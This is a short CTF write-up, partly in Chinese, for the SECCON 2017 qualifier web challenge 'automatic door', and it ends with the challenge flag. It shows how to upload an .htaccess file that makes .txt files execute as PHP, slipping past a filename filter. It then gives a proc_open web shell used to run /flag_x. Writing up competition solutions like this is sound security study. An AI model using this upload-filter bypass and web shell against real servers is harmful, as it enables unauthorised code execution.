# SECCON CTF QUALS 2017 : automatic door

**category** : web
**points** : 500

> Get shell, and execute /flag_x
>
> http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/

## write-up

網站提供 read 和 write 和 看 phpinfo 和 看當前路徑 的功能

主要的思路就是放一個可以用的 webshell 上去 ( `strstr($f, 'ph')` 這行限制了不能上傳 `.php` )

先看 phpinfo 可以看到系統是 `linux` 然後很多被 ban 的 function

![](https://i.imgur.com/5wjyXtQ.png)

所以首先我們先上傳 `.htaccess` 讓我們可以傳 `.txt` 他就會當作 php script 執行

```
AddType application/x-httpd-php .txt
```

我是用 postman 上傳檔案

![](https://i.imgur.com/mqoPozo.png)

`proc_open` 很剛好的沒有被 ban

上傳 `shell.txt` 再去瀏覽 `http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/sandbox/FAIL_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/shell.txt`

```php
<?php
$cwd = '';
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("file", "/tmp/error-output.txt", "a")
);

$process = proc_open("/flag_x", $descriptorspec, $pipes, $cwd);

echo stream_get_contents($pipes[1]);
fclose($pipes[1]);
?>
```

flag : SECCON{f6c085facd0897b47f5f1d7687030ae7}

## other write-ups and resources

* https://ctftime.org/writeup/8340
* https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/web_automatic
* https://blog.veryhax.ninja/blog/seccon-2017-automatic_door/
